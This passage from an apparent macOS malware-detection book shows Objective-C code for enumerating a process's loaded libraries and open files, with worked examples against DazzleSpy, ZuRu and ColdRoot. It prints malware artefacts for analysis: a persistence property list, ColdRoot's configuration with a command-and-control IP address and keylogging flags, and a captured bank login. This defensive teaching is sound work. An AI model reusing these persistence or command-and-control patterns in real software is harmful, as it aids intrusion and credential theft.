<p class="TX">This process information, gathered via a single XPC call, can confirm knowledge obtained from other sources and provide new details. For example, if you query a launch agent or daemon such as DazzleSpy, the <span class="SANS_TheSansMonoCd_W5Regular_11">path</span> key in the process information response will contain the property list responsible for spawning the item:</p>&#13;
&#13;
<pre><code>path = /Users/User/Library/LaunchAgents/com.apple.softwareupdate.plist</code></pre>&#13;
<p class="TX">We can confirm this fact by manually examining the reported property list (which, for DazzleSpy, was <i>com.apple.softwareupdate.plist</i>) and noting that the path specified does indeed point back to the malware’s binary:</p>&#13;
&#13;
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;&#13;
...&#13;
&lt;plist version="1.0"&gt;&#13;
&lt;dict&gt;&#13;
    &lt;key&gt;KeepAlive&lt;/key&gt;&#13;
    &lt;true/&gt;&#13;
    &lt;key&gt;Label&lt;/key&gt;&#13;
    &lt;string&gt;com.apple.softwareupdate&lt;/string&gt;&#13;
    &lt;key&gt;ProgramArguments&lt;/key&gt;&#13;
    &lt;array&gt;&#13;
        &lt;string&gt;<b>/Users/User/.local/softwareupdate</b>&lt;/string&gt;&#13;
        &lt;string&gt;1&lt;/string&gt;&#13;
    &lt;/array&gt;&#13;
    &lt;key&gt;RunAtLoad&lt;/key&gt;&#13;
    &lt;true/&gt;&#13;
    &lt;key&gt;SuccessfulExit&lt;/key&gt;&#13;
    &lt;true/&gt;&#13;
&lt;/dict&gt;&#13;
&lt;/plist&gt;&#13;
</code></pre>&#13;
<p class="TX">Having a means of tracing a process ID back to the launch item property list that triggered its spawning is quite useful. Why? Well, to achieve <span role="doc-pagebreak" epub:type="pagebreak" id="pg_24" aria-label="24"/>persistence, the majority of malware installs itself as a launch item. Though legitimate software also persists in this manner, these launch items are all worth examining, as you have a good chance of finding any persistently installed malware among them.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec13">&#13;
&#13;
<h3 class="H1" id="sec13"><span id="h1-13"/><span class="SANS_Futura_Std_Bold_B_11">Code Signing</span></h3>&#13;
<p class="TNI">In a nutshell, <i>code signing</i> can prove who created an item and verify that it hasn’t been tampered with. Any detection algorithm attempting to classify a running process as malicious or benign should thus extract this code signing information. You should closely examine unsigned processes and those signed in an ad hoc manner, because these days, the vast majority of legitimate programs you’ll find running on macOS are both signed and notarized.</p>&#13;
<p class="TX">Speaking of validly signed processes, those belonging to well-known software developers are most likely benign (supply chain attacks aside). Moreover, if Apple proper has signed a process, it won’t be malware (although, as we’ve seen, malware could leverage Apple binaries to perform malicious actions, as in the case of the Lazarus group’s use of <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> to download additional malicious payloads).</p>&#13;
<p class="TX">Due to its importance, an entire chapter is dedicated solely to the topic of code signing. In <span class="Xref"><a href="chapter3.xhtml">Chapter 3</a></span>, we discuss the topic comprehensively, applying it to running processes as well as to items such as disk images and packages.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec14">&#13;
&#13;
<h3 class="H1" id="sec14"><span id="h1-14"/><span class="SANS_Futura_Std_Bold_B_11">Loaded Libraries</span></h3>&#13;
<p class="TNI">When attempting to uncover malware by analyzing running processes, you must also enumerate any loaded libraries. Stealthy malware, such as ZuRu, doesn’t spawn a stand-alone process, but rather is loaded into a subverted, although otherwise legitimate, one. In this case, the process’s main executable binary will be benign, though modified to reference the malicious library to ensure it is loaded.</p>&#13;
<p class="TX">Even if the malware does execute as a stand-alone process, you’ll still want to enumerate its loaded libraries for the following reasons:</p>&#13;
<ul class="ul">&#13;
<li class="BL">The malware may load additional malicious plug-ins, which you’ll likely want to scan or analyze.</li>&#13;
<li class="BL">The malware may load legitimate system libraries to perform subversive actions. These can provide insight into the malware’s capabilities (for example, it might load the system framework used to interface with the mic or webcam).</li>&#13;
</ul>&#13;
<p class="TX">Unfortunately, due to macOS security features, even signed, notarized third-party security tools cannot directly enumerate loaded libraries. Luckily, there are indirect ways to do so using built-in macOS utilities such as <span class="SANS_TheSansMonoCd_W5Regular_11">vmmap</span>. This tool possesses several Apple-only entitlements that allow it to read the memory of remote processes and provide a mapping that includes any loaded libraries.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_25" aria-label="25"/>Run <span class="SANS_TheSansMonoCd_W5Regular_11">vmmap</span> against the aforementioned ZuRu, which trojanizes a copy of the popular iTerm(2) application. It’s a good example, as its malicious logic is implemented solely in a dynamic library named <i>libcrypto.2.dylib</i>. We’ll execute <span class="SANS_TheSansMonoCd_W5Regular_11">vmmap</span> with the <span class="SANS_TheSansMonoCd_W5Regular_11">-w</span> flag so that it prints out the full path of ZuRu’s mapped libraries. The tool expects a process ID, so we provide it with ZuRu’s (here, 932):</p>&#13;
&#13;
<pre><code>% <b>pgrep iTerm2</b>&#13;
932&#13;
&#13;
% <b>vmmap -w 932</b>&#13;
Process:         iTerm2 [932]&#13;
Path:            /Applications/iTerm.app/Contents/MacOS/iTerm2&#13;
...&#13;
==== Non-writable regions for process 932&#13;
REGION     START - END         DETAIL&#13;
__TEXT     102b2b000-103247000 /Applications/iTerm.app/Contents/MacOS/iTerm2&#13;
__LINKEDIT 103483000-103cb4000 /Applications/iTerm.app/Contents/MacOS/iTerm2&#13;
...&#13;
__TEXT     10da4d000-10da85000 /Applications/iTerm.app/Contents/Frameworks/libcrypto.2.dylib&#13;
__LINKEDIT 10da91000-10dacd000 /Applications/iTerm.app/Contents/Frameworks/libcrypto.2.dylib&#13;
...&#13;
</code></pre>&#13;
<p class="TX">In this abridged output, you can see mappings of the binary’s main image (iTerm2), as well as dynamic libraries such as the dynamic loader <i>dyld</i> and the malicious library <i>libcrypto.2.dylib</i>.</p>&#13;
<p class="TX">How did I determine that <i>libcrypto.2.dylib</i> was the malicious component? After noticing that Jun Bi, rather than the legitimate developer, had signed this copy of iTerm2, I compared a list of its loaded libraries with a list of the libraries loaded by the original application. There was only one difference: <i>libcrypto.2.dylib</i>. Static analysis confirmed that this anomalous library was indeed malicious.</p>&#13;
<p class="TX">Because we don’t possess the private Apple entitlements needed to read remote process memory (which includes all loaded libraries), we’ll simply execute <span class="SANS_TheSansMonoCd_W5Regular_11">vmmap</span> and parse its output. Several of my Objective-See tools, such as TaskExplorer,<sup><a role="doc-noteref" id="chapter1_13" href="#chapter1-13">13</a></sup> take this approach. You can also find code that implements this process in a function named <span class="SANS_TheSansMonoCd_W5Regular_11">getLibraries</span> in the <i>enumerateProcesses</i> project.</p>&#13;
<p class="TX">First, we need a helper function capable of executing an external binary and returning its output (<a href="chapter1.xhtml#Lis1-24">Listing 1-24</a>).</p>&#13;
<span id="Lis1-24"/>&#13;
<pre><code>#define STDERR @"stdError"&#13;
#define STDOUT @"stdOutput"&#13;
&#13;
#define EXIT_CODE @"exitCode"&#13;
&#13;
NSMutableDictionary* execTask(NSString* binaryPath, NSArray* arguments) {&#13;
    NSTask* task = nil;&#13;
    NSPipe* stdOutPipe = nil;&#13;
    NSFileHandle* stdOutReadHandle = nil;&#13;
    NSMutableDictionary* results = nil;&#13;
    NSMutableData* stdOut = nil;&#13;
&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_26" aria-label="26"/>    results = [NSMutableDictionary dictionary];&#13;
    task = [NSTask new];&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation1">❶</span> stdOutPipe = [NSPipe pipe];&#13;
    stdOutReadHandle = [stdOutPipe fileHandleForReading];&#13;
    stdOutData = [NSMutableData data];&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation2">❷</span> task.standardOutput = stdOutPipe;&#13;
    task.launchPath = binaryPath;&#13;
&#13;
    if(nil != arguments) {&#13;
        task.arguments = arguments;&#13;
    }&#13;
&#13;
    [task launch];&#13;
&#13;
    while(YES == [task isRunning]) {&#13;
      <span class="Code_CodeAnnotation" aria-label="annotation3">❸</span> [stdOutData appendData:[stdOutReadHandle readDataToEndOfFile]];&#13;
    }&#13;
&#13;
    [stdOutData appendData:[stdOutReadHandle readDataToEndOfFile]];&#13;
    if(0 != stdOutData.length) {&#13;
      <span class="Code_CodeAnnotation" aria-label="annotation4">❹</span> results[STDOUT] = stdOutData;&#13;
    }&#13;
&#13;
    results[EXIT_CODE] = [NSNumber numberWithInteger:task.terminationStatus];&#13;
&#13;
    return results;&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-24: Executing a task and capturing its output</span></p>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">execTask</span> function executes a task using the specified parameters via Apple’s <span class="SANS_TheSansMonoCd_W5Regular_11">NSTask</span> API. It waits until the spawned task has completed and returns a dictionary containing various key-value pairs, including any output the command generated, to <span class="SANS_TheSansMonoCd_W5Regular_11">stdout</span>. To capture the task’s output, the code initializes a pipe object (<span class="SANS_TheSansMonoCd_W5Regular_11">NSPipe</span>) <span class="CodeAnnotation" aria-label="annotation1">❶</span> and then sets it as the task’s standard output <span class="CodeAnnotation" aria-label="annotation2">❷</span>. When the task generates output, the code reads off the pipe’s file handle <span class="CodeAnnotation" aria-label="annotation3">❸</span> and appends it to a data buffer. Once the task exits, any remaining output is read and the data buffer is saved into the <span class="SANS_TheSansMonoCd_W5Regular_11">results</span> dictionary, which is returned to the caller <span class="CodeAnnotation" aria-label="annotation4">❹</span>.</p>&#13;
<p class="TX">The function’s caller, for example, <span class="SANS_TheSansMonoCd_W5Regular_11">getLibraries</span>, can invoke it with a path to any binary, along with any arguments. If needed, we can convert its output into a string object (<a href="chapter1.xhtml#Lis1-25">Listing 1-25</a>).</p>&#13;
<span id="Lis1-25"/>&#13;
<pre><code>pid_t pid = &lt;some process id&gt;;&#13;
&#13;
NSMutableDictionary* results = execTask(@"/usr/bin/vmmap", @[@"-w", [[NSNumber&#13;
numberWithInt:pid] stringValue]]);&#13;
&#13;
NSString* output = [[NSString alloc] initWithData:results[STDOUT]&#13;
encoding:NSUTF8StringEncoding];&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-25: Converting task output into a string object</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_27" aria-label="27"/>We can then parse the <span class="SANS_TheSansMonoCd_W5Regular_11">vmmap</span> output in many ways, such as line by line or via regular expressions. <a href="chapter1.xhtml#Lis1-26">Listing 1-26</a> shows one technique.</p>&#13;
<span id="Lis1-26"/>&#13;
<pre><code>NSMutableArray* dylibs = [NSMutableArray array];&#13;
&#13;
for(NSString* line in&#13;
[output componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]]) {&#13;
    if(YES != [line hasPrefix:@"__TEXT"]) {&#13;
        continue;&#13;
    }&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-26: Parsing the output lines that start with __TEXT</span></p>&#13;
<p class="TX">Here, we search for lines that start with <span class="SANS_TheSansMonoCd_W5Regular_11">__TEXT</span>, as all dynamically loaded libraries in the <span class="SANS_TheSansMonoCd_W5Regular_11">vmmap</span> output start with memory regions of this type. These lines of data also contain the full path of the loaded library, which is what we’re really after. <a href="chapter1.xhtml#Lis1-27">Listing 1-27</a> extracts these paths within the <span class="SANS_TheSansMonoCd_W5Regular_11">for</span> loop shown in <a href="chapter1.xhtml#Lis1-26">Listing 1-26</a>.</p>&#13;
<span id="Lis1-27"/>&#13;
<pre><code>NSRange pathOffset = {0};&#13;
NSString* token = @"SM=COW";&#13;
&#13;
pathOffset = [line rangeOfString:token];&#13;
if(NSNotFound == pathOffset.location) {&#13;
    continue;&#13;
}&#13;
&#13;
dylib = [[line substringFromIndex:pathOffset.location+token.length]&#13;
stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];&#13;
&#13;
if(dylib != nil) {&#13;
    [dylibs addObject:dylib];&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-27: Extracting the dynamic library’s path</span></p>&#13;
<p class="TX">The code first looks for the <i>copy-on-write</i> share mode (<span class="SANS_TheSansMonoCd_W5Regular_11">"SM=COW"</span>), which precedes the path. If found, then, using the offset following the share mode, it extracts the path itself. At this point, the <span class="SANS_TheSansMonoCd_W5Regular_11">dylibs</span> array should contain all dynamic libraries loaded by the target process.</p>&#13;
<p class="TX">Now let’s execute <i>enumerateProcesses</i> while running the same instance of ZuRu we saw earlier:</p>&#13;
&#13;
<pre><code>% <b>./enumerateProcesses</b>&#13;
...&#13;
(932):/Applications/iTerm.app/Contents/MacOS/iTerm2&#13;
...&#13;
Dynamic libraries for process iTerm2 (932):&#13;
(&#13;
"/Applications/iTerm.app/Contents/MacOS/iTerm2",&#13;
"/usr/lib/dyld",&#13;
"/Applications/iTerm.app/Contents/Frameworks/<b>libcrypto.2.dylib</b>",&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_28" aria-label="28"/>...&#13;
)&#13;
</code></pre>&#13;
<p class="TX">As you can see, we’re able to extract all loaded libraries in ZuRu’s address space, including the malicious <i>libcrypto.2.dylib</i>.</p>&#13;
<p class="TX">Note that on recent versions of macOS, system frameworks (which are essentially a type of dynamically loaded library) have been moved into what is known as the <i>dyld_shared_cache</i>. However, <span class="SANS_TheSansMonoCd_W5Regular_11">vmmap</span> will still report the frameworks’ original paths. This is a notable point for two main reasons. First, if you want to examine the framework’s code, you’ll have to extract it from the shared cache.<sup><a role="doc-noteref" id="chapter1_14" href="#chapter1-14">14</a></sup></p>&#13;
<p class="TX">Second, if you’ve implemented logic to detect self-deleting framework libraries, you should make an exception for these frameworks. Otherwise, your code will report that they’ve been deleted. One simple way to check if a given framework has been moved to the cache is to invoke Apple’s <i>_dyld _shared_cache_contains_path</i> API.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec15">&#13;
&#13;
<h3 class="H1" id="sec15"><span id="h1-15"/><span class="SANS_Futura_Std_Bold_B_11">Open Files</span></h3>&#13;
<p class="TNI">Just as enumerating loaded libraries can provide insight into the capabilities of a process, so can enumerating any open files. This technique could help us identify malware known as ColdRoot, a RAT that affords a remote attacker complete control over an infected system.<sup><a role="doc-noteref" id="chapter1_15" href="#chapter1-15">15</a></sup> If you list all files opened by each process on a system infected with this malware, you’ll encounter a strange file named <i>conx.wol</i> opened by a process named <i>com.apple.audio .driver.app</i>. Upon closer examination, it will become obvious that the process does not belong to Apple and is in fact malware (ColdRoot), <i>conx.wol</i> is the malware’s configuration file, and it contains valuable information to defenders, including the address of the command-and-control server:</p>&#13;
&#13;
<pre><code>% <b>cat com.apple.audio.driver.app/Contents/MacOS/conx.wol</b>&#13;
{&#13;
    "PO": 80,&#13;
    "HO": "45.77.49.118",&#13;
    "MU": "CRHHrHQuw JOlybkgerD",&#13;
    "VN": "Mac_Vic",&#13;
    "LN": "adobe_logs.log",&#13;
    "KL": true,&#13;
    "RN": true,&#13;
    "PN": "com.apple.audio.driver"&#13;
}&#13;
</code></pre>&#13;
<p class="TX">Later on, you’ll encounter another file opened by the malware, <i>adobe_logs.log</i>, which appears to contain captured keystrokes, including a username and password for a bank account:</p>&#13;
&#13;
<pre><code>bankofamerica.com&#13;
[enter]&#13;
user&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_29" aria-label="29"/>[tab]&#13;
hunter2&#13;
[enter]&#13;
</code></pre>&#13;
<p class="TX">You might be wondering how you can determine that these files are malicious using programmatic methods alone. Truthfully, this would be complicated. It would perhaps involve creating a regular expression to look for URLs, IP addresses, or what appear to be captured keypresses, such as control characters. However, it’s more likely that other detection logic will have already cast this unsigned packed malware as suspicious and flagged it for closer examination, ideally by a human malware analyst. ColdRoot, for example, is unsigned, packed, and persisted. In this case, the code could provide the analyst with both a list of any file opened by the suspicious process and the file contents. An analyst could then manually confirm that the flagged process was malware and use the files to gain a cursory understanding of how it works.</p>&#13;
<p class="TX">In this section, we discuss two approaches to programmatically enumerating all files opened by a process.</p>&#13;
<section epub:type="division" aria-labelledby="sec16">&#13;
&#13;
<h4 class="H2" id="sec16"><span id="h2-11"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">proc_pidinfo</span></h4>&#13;
<p class="TNI">The traditional approach to enumerating the files a process currently has open involves the <span class="SANS_TheSansMonoCd_W5Regular_11">proc_pidinfo</span> API. In short, invoking this API with the <span class="SANS_TheSansMonoCd_W5Regular_11">PROC_PIDLISTFDS</span> flag will return a list of open file descriptors for a given process. Let’s walk through a code example that illustrates the use of this API. You can find the complete code in a function named <span class="SANS_TheSansMonoCd_W5Regular_11">getFiles</span> in the <i>enumerateProcesses</i> project. We start by retrieving a process’s file descriptors (<a href="chapter1.xhtml#Lis1-28">Listing 1-28</a>).</p>&#13;
<span id="Lis1-28"/>&#13;
<pre><code><span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> int size = proc_pidinfo(pid, PROC_PIDLISTFDS, 0, 0, 0);&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation2">❷</span> struct proc_fdinfo* fdInfo = (struct proc_fdinfo*)malloc(size);&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation3">❸</span> proc_pidinfo(pid, PROC_PIDLISTFDS, 0, fdInfo, size);&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-28: Obtaining a list of a process’s file descriptors</span></p>&#13;
<p class="TX">The code invokes the <span class="SANS_TheSansMonoCd_W5Regular_11">proc_pidinfo</span> API with a process ID for a target process, the <span class="SANS_TheSansMonoCd_W5Regular_11">PROC_PIDLISTFDS</span> flag, and a series of zeros to obtain the size of memory needed to hold the process’s list of file descriptors <span class="CodeAnnotation" aria-label="annotation1">❶</span>. We then allocate a buffer of this size to hold pointers of <span class="SANS_TheSansMonoCd_W5Regular_11">proc_fdinfo</span> structures <span class="CodeAnnotation" aria-label="annotation2">❷</span>. Then, to obtain the actual list of descriptors, we reinvoke the <span class="SANS_TheSansMonoCd_W5Regular_11">proc_pidinfo</span> API, this time with the freshly allocated buffer and its size <span class="CodeAnnotation" aria-label="annotation3">❸</span>.</p>&#13;
<p class="TX">Now that we have a list of open file descriptors, let’s examine each of them. Regular files should have descriptors of type <span class="SANS_TheSansMonoCd_W5Regular_11">PROX_FDTYPE_VNODE</span>. <a href="chapter1.xhtml#Lis1-29">Listing 1-29</a> retrieves the paths of these files.</p>&#13;
<span id="Lis1-29"/>&#13;
<pre><code>NSMutableArray* files = [NSMutableArray array];&#13;
&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation1">❶</span> for(int i = 0; i &lt; (size/PROC_PIDLISTFD_SIZE); i++) {&#13;
        struct vnode_fdinfowithpath vnodeInfo = {0};&#13;
&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_30" aria-label="30"/>      <span class="Code_CodeAnnotation" aria-label="annotation2">❷</span> if(PROX_FDTYPE_VNODE != fdInfo[i].proc_fdtype) {&#13;
            continue;&#13;
        }&#13;
&#13;
      <span class="Code_CodeAnnotation" aria-label="annotation3">❸</span> proc_pidfdinfo(pid, fdInfo[i].proc_fd,&#13;
        PROC_PIDFDVNODEPATHINFO, &amp;vnodeInfo, PROC_PIDFDVNODEPATHINFO_SIZE);&#13;
&#13;
      <span class="Code_CodeAnnotation" aria-label="annotation4">❹</span> [files addObject:[NSString stringWithUTF8String:vnodeInfo.pvip.vip_path]];&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-29: Extracting the paths from the file descriptors</span></p>&#13;
<p class="TX">Using a <span class="SANS_TheSansMonoCd_W5Regular_11">for</span> loop, we iterate over the retrieved file descriptors <span class="CodeAnnotation" aria-label="annotation1">❶</span>. For each descriptor, we check whether it is of type <span class="SANS_TheSansMonoCd_W5Regular_11">PROX_FDTYPE_VNODE</span> and skip all other types <span class="CodeAnnotation" aria-label="annotation2">❷</span>. We then invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">proc_pidfdinfo</span> API with various parameters, such as the process ID, the file descriptor, and <span class="SANS_TheSansMonoCd_W5Regular_11">PROC_PIDFDVNODEPATHINFO</span>, as well as an output structure of type <span class="SANS_TheSansMonoCd_W5Regular_11">vnode_fdinfowithpath</span> and its size <span class="CodeAnnotation" aria-label="annotation3">❸</span>. This should return information about the specified file descriptor, including its path. Once the call completes, we can find the path in the <span class="SANS_TheSansMonoCd_W5Regular_11">vip_path</span> member of the <span class="SANS_TheSansMonoCd_W5Regular_11">pvip</span> structure, within the <span class="SANS_TheSansMonoCd_W5Regular_11">vnode_fdinfowithpath</span> structure. We extract the member, convert it into a string object, and save it into an array <span class="CodeAnnotation" aria-label="annotation4">❹</span>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec17">&#13;
&#13;
<h4 class="H2" id="sec17"><span id="h2-12"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">lsof</span></h4>&#13;
<p class="TNI">Another way of enumerating open files for a process is to mimic macOS’s Activity Monitor utility. Though this approach relies on an external macOS executable, it often produces a more comprehensive list than the <span class="SANS_TheSansMonoCd_W5Regular_11">proc_pidinfo</span> approach.</p>&#13;
<p class="TX">After selecting a process in Activity Monitor, a user can click the information icon and then the Open Files and Ports tab to see all files the process has opened. By reverse engineering Activity Monitor, we can learn that it accomplishes this behavior behind the scenes by executing <span class="SANS_TheSansMonoCd_W5Regular_11">lsof</span>, a built-in macOS tool for listing open files.</p>&#13;
<p class="TX">You can confirm that Activity Monitor uses <span class="SANS_TheSansMonoCd_W5Regular_11">lsof</span> via a process monitor, a tool I’ll show you how to create in <span class="Xref"><a href="chapter8.xhtml">Chapter 8</a></span>. When a user clicks the Open Files and Ports tab, the process monitor will show <span class="SANS_TheSansMonoCd_W5Regular_11">lsof</span> being executed with the command line flags <span class="SANS_TheSansMonoCd_W5Regular_11">-Fn</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">-p</span>:</p>&#13;
&#13;
<pre><code># <b>./ProcessMonitor.app/Contents/MacOS/ProcessMonitor</b>&#13;
&#13;
{&#13;
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",&#13;
  "process" : {&#13;
    "pid" : 86903&#13;
    "name" :<b> "lsof",</b>&#13;
    "path" : "/usr/sbin/lsof",&#13;
&#13;
    "arguments" : [&#13;
      "/usr/sbin/lsof",&#13;
<b>      "-Fn",</b>&#13;
<b>      "-p",</b>&#13;
      "590"&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_31" aria-label="31"/>    ],&#13;
...&#13;
}&#13;
</code></pre>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">-p</span> flag specifies the process’s ID, and the <span class="SANS_TheSansMonoCd_W5Regular_11">-F</span> flag selects fields to be processed. When this flag is followed by <span class="SANS_TheSansMonoCd_W5Regular_11">n</span>, the tool will print out just the file’s path, which is exactly what we want.</p>&#13;
<p class="TX">Let’s follow the approach taken by Activity Monitor and execute the <span class="SANS_TheSansMonoCd_W5Regular_11">lsof</span> binary for a given process, then programmatically parse its output. You can find the complete code that implements this approach in a function named <span class="SANS_TheSansMonoCd_W5Regular_11">getFiles2</span> in the <i>enumerateProcesses</i> project. In <a href="chapter1.xhtml#Lis1-30">Listing 1-30</a>, we start by executing <span class="SANS_TheSansMonoCd_W5Regular_11">lsof</span> with the <span class="SANS_TheSansMonoCd_W5Regular_11">-Fn</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">-p</span> flags and a process ID.</p>&#13;
<span id="Lis1-30"/>&#13;
<pre><code>NSString* pidAsString = [NSNumber numberWithInt:pid].stringValue;&#13;
NSMutableDictionary* results = execTask(@"/usr/sbin/lsof", @[@"-Fn", @"-p", pidAsString]);&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-30: Programmatically executing <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">lsof</span></span></p>&#13;
<p class="TX">We reuse the <span class="SANS_TheSansMonoCd_W5Regular_11">execTask</span> function created in <a href="chapter1.xhtml#Lis1-24">Listing 1-24</a> to run the command. However, because command line arguments are passed to external processes as strings, we must first convert the target process ID to a string. Recall that the <span class="SANS_TheSansMonoCd_W5Regular_11">execTask</span> function will wait until the spawned task has completed, capture any output, and return it to the caller. <a href="chapter1.xhtml#Lis1-31">Listing 1-31</a> shows one approach to parsing <span class="SANS_TheSansMonoCd_W5Regular_11">lsof</span>’s output.</p>&#13;
<span id="Lis1-31"/>&#13;
<pre><code>NSMutableArray* files = [NSMutableArray array];&#13;
&#13;
NSArray* lines = [[[NSString alloc] initWithData:results[STDOUT] <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
encoding:NSUTF8StringEncoding] componentsSeparatedByCharactersInSet:[NSCharacterSet&#13;
newlineCharacterSet]]; <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
&#13;
for(NSString* result in lines) {&#13;
    if(YES == [result hasPrefix:@"n"]) { <span class="codewide_CodeAnnotation" aria-label="annotation3">❸</span>&#13;
        NSString* file = [result substringFromIndex:1];&#13;
        [files addObject:file];&#13;
    }&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-31: Parsing output from <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">lsof</span></span></p>&#13;
<p class="TX">The output is stored in a dictionary named <span class="SANS_TheSansMonoCd_W5Regular_11">results</span>, and you can access it via the key <span class="SANS_TheSansMonoCd_W5Regular_11">STDOUT</span> <span class="CodeAnnotation" aria-label="annotation1">❶</span>. You can split the output on newline characters in order to process it line by line <span class="CodeAnnotation" aria-label="annotation2">❷</span>. Then iterate over each line, looking for those that contain a filepath (which are prefixed with <span class="SANS_TheSansMonoCd_W5Regular_11">n</span>) <span class="CodeAnnotation" aria-label="annotation3">❸</span>, and save them.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec18">&#13;
&#13;
<h3 class="H1" id="sec18"><span id="h1-16"/><span class="SANS_Futura_Std_Bold_B_11">Other Information</span></h3>&#13;
<p class="TNI">There is, of course, other information you might want to extract from running processes to help you with the detection of malicious code on a macOS system. This chapter wraps up with a few examples that examine <span role="doc-pagebreak" epub:type="pagebreak" id="pg_32" aria-label="32"/>the following details about a process: its execution state, its execution architecture, its start time, and its CPU utilization. You might also want to determine its network state, a topic covered in <span class="Xref"><a href="chapter4.xhtml">Chapter 4</a></span>.</p>&#13;
<section epub:type="division" aria-labelledby="sec19">&#13;
&#13;
<h4 class="H2" id="sec19"><span id="h2-13"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Execution State</span></h4>&#13;
<p class="TNI">Imagine you have retrieved a list of process IDs. You’ll likely want to query the process further (for example, to build a process ancestry tree or compute code signing information). But what if the process has already exited, as in the case of a short-lived shell command? This is pertinent information, and at the very least, you’ll want to understand why any attempts to further query the process fail.</p>&#13;
<p class="TX">A trivial way to determine whether a process is dead is to attempt to send it a signal. One way to do this is via the <span class="SANS_TheSansMonoCd_W5Regular_11">kill</span> system API with a signal type of <span class="SANS_TheSansMonoCd_W5Regular_11">0</span>, as shown in <a href="chapter1.xhtml#Lis1-32">Listing 1-32</a>.</p>&#13;
<span id="Lis1-32"/>&#13;
<pre><code>kill(targetPID, 0);&#13;
if(ESRCH == errno) {&#13;
    // Code placed here will run only if the process is dead.&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-32: Checking whether a process is dead</span></p>&#13;
<p class="TX">This won’t kill any living processes; in fact, it’s totally harmless. However, if a process has exited, the API will set <span class="SANS_TheSansMonoCd_W5Regular_11">errno</span> to <span class="SANS_TheSansMonoCd_W5Regular_11">ESRCH</span> (no such process).</p>&#13;
<p class="TX">What if the process is zombie-fied? You can use the <span class="SANS_TheSansMonoCd_W5Regular_11">sysctl</span> API to populate a <span class="SANS_TheSansMonoCd_W5Regular_11">kinfo_proc</span> structure, as in <a href="chapter1.xhtml#Lis1-33">Listing 1-33</a>.</p>&#13;
<span id="Lis1-33"/>&#13;
<pre><code>int mib[4] =  {CTL_KERN, KERN_PROC, KERN_PROC_PID, pid};&#13;
size_t size = sizeof(procInfo);&#13;
&#13;
sysctl(mib, 4, &amp;procInfo, &amp;size, NULL, 0);&#13;
if(SZOMB == (SZOMB &amp; procInfo.kp_proc.p_stat)) {&#13;
    // Code placed here will run only if the process is a zombie.&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-33: Checking whether a process is a zombie</span></p>&#13;
<p class="TX">This structure contains a flag named <span class="SANS_TheSansMonoCd_W5Regular_11">p_stat</span>. If that flag has the <span class="SANS_TheSansMonoCd_W5Regular_11">SZOMB</span> bit set, you know the process is a zombie.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec20">&#13;
&#13;
<h4 class="H2" id="sec20"><span id="h2-14"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Execution Architecture</span></h4>&#13;
<p class="TNI">With the introduction of Apple Silicon, macOS now supports both Intel (x86_64) and ARM (ARM64) binaries. Because many analysis tools are specific to a file’s architecture, identifying this information for a process is important. Moreover, although developers have recompiled most legitimate software to run natively on Apple Silicon, malware is still playing catch-up; <span role="doc-pagebreak" epub:type="pagebreak" id="pg_33" aria-label="33"/>a surprising amount of it is still distributed as Intel binaries. Some examples of malware discovered in 2022 that are distributed solely as Intel binaries include DazzleSpy, rShell, oRat, and CoinMiner:</p>&#13;
